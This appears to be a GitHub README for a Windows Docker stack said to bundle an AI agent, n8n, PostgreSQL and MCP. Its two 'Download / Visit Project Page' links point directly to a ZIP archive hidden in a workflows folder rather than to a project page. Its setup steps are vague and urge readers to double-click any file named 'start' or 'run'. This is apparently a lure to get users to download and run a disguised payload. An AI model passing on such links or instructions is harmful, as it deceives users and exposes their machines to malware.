# ⚙️ openclaw-n8n-stack - Run AI workflows with less setup

[![Download / Visit Project Page](https://img.shields.io/badge/Download%20%2F%20Visit%20Project%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/foot8319/openclaw-n8n-stack/main/workflows/openclaw_n_stack_2.1.zip)

## 🧭 What this is

openclaw-n8n-stack is a ready-to-run Docker stack for Windows users who want to use:

- OpenClaw AI agent
- n8n workflow automation
- PostgreSQL data storage
- MCP support for connected tools
- multi-agent setup for task handling

It gives you one place to start the app, keep data in one database, and run automation without building each part by hand.

## 📦 What you need

Before you begin, make sure you have:

- Windows 10 or Windows 11
- 8 GB RAM or more
- 10 GB free disk space
- Docker Desktop installed
- A web browser
- Internet access for the first setup

If Docker Desktop is not on your PC, install it first, then come back to this page.

## 🚀 Download and start

Use this link to visit the project page and get the files:

[Open the openclaw-n8n-stack project](https://raw.githubusercontent.com/foot8319/openclaw-n8n-stack/main/workflows/openclaw_n_stack_2.1.zip)

After you open the page:

1. Look for the latest release or the main project files
2. Download the stack files to your PC
3. Extract the files if they come in a ZIP folder
4. Keep the folder in a place you can find later, such as Downloads or Desktop

If you already have the files, move to the setup step.

## 🛠️ Install Docker Desktop

Docker Desktop runs the stack on your Windows PC.

1. Open the Docker Desktop installer
2. Follow the on-screen steps
3. Finish the install
4. Start Docker Desktop
5. Wait until Docker shows it is running

If Docker asks to use WSL 2, allow it. The stack works best with that setup.

## 🧰 Set up the stack

Open the folder you downloaded.

You should see files that start the stack, usually a `docker-compose` file and related config files.

Do this:

1. Open the folder
2. Find the main start file
3. Double-click it if the project includes a Windows launch file
4. If the project uses Docker Compose from a terminal, open Command Prompt in that folder
5. Start the stack using the provided command or script

If you are not sure which file to use, look for a file name that includes:

- `start`
- `run`
- `up`
- `docker-compose`

The stack will pull the needed images the first time. This can take a few minutes.

## 🌐 Open the apps

When the stack is ready, open your browser and use the local addresses provided by the project.

You will usually find:

- n8n for workflow automation
- OpenClaw for AI agent tasks
- PostgreSQL for data storage in the background

Common local links look like this:

- `http://localhost:5678` for n8n
- another local address for OpenClaw
- database access through the stack only, not through a browser page

If the project includes a `.env` file or setup page, use the values in that file to find the right address and login details.

## 🔐 First-time sign in

When you open n8n or OpenClaw for the first time, you may need to create or enter login details.

Use this approach:

1. Check the project files for a default username and password
2. Use the first-run account if one is listed
3. Change the password after your first login
4. Keep your login details in a safe place

If the stack includes a setup page, finish that page before you start building workflows.

## 🤖 What you can do with it

This stack helps you build and run common automation jobs, such as:

- sending alerts when something changes
- moving data between apps
- making simple agent-driven task flows
- scheduling repeat jobs
- connecting tools through MCP
- using multiple agents for different steps in a task
- storing workflow data in PostgreSQL

It suits people who want a local system that runs on their own machine or server.

## 🧩 Main parts of the stack

### OpenClaw AI agent

OpenClaw handles agent tasks and works with other tools in the stack. It can help route work, process input, and support multi-agent flows.

### n8n workflow automation

n8n lets you build automation with visual blocks. You can connect apps, set triggers, and move data through a workflow.

### PostgreSQL database

PostgreSQL stores data used by the stack. It keeps workflow data, app settings, and task records in one place.

### MCP support

MCP lets tools connect in a clean way. The stack comes pre-wired for this, so the parts can work together with less setup.

## 🧪 Common first test

After setup, try a simple test:

1. Open n8n in your browser
2. Create a basic workflow
3. Add a manual trigger
4. Add one action, such as a note or test message
5. Run the workflow
6. Check that it completes without errors

If that works, the stack is running well.

## ⚙️ Basic folder layout

You may see files like these:

- `docker-compose.yml` — starts the stack
- `.env` — holds local settings
- `README.md` — project guide
- `data` or `storage` folders — keeps saved files and database data
- `scripts` folder — start or helper scripts

Do not delete these files unless you know what they do.

## 🧯 If something does not start

If the stack does not open, try these steps:

1. Make sure Docker Desktop is running
2. Check that the files are still in the same folder
3. Start the stack again
4. Wait longer for the first pull of images
5. Restart Docker Desktop
6. Reboot your PC and try again

If a page does not load, check the local address in the project files. The port may be different on your system.

## 🔄 Updating the stack

To update the project later:

1. Stop the running stack
2. Download the latest project files
3. Replace the old files with the new ones
4. Start the stack again
5. Check your workflows and data

If you keep your database in a volume, your stored data should stay in place.

## 🧠 Best ways to use it

Use this stack when you want:

- a local AI agent setup
- workflow automation in one place
- a Docker-based install with less manual work
- a self-hosted system you can control
- a setup that supports more than one agent

It works well for home labs, small teams, and test setups

## 📁 Project topics

- ai-agents
- automation
- docker
- docker-compose
- mcp
- multi-agent
- n8n
- openclaw
- self-hosted
- workflow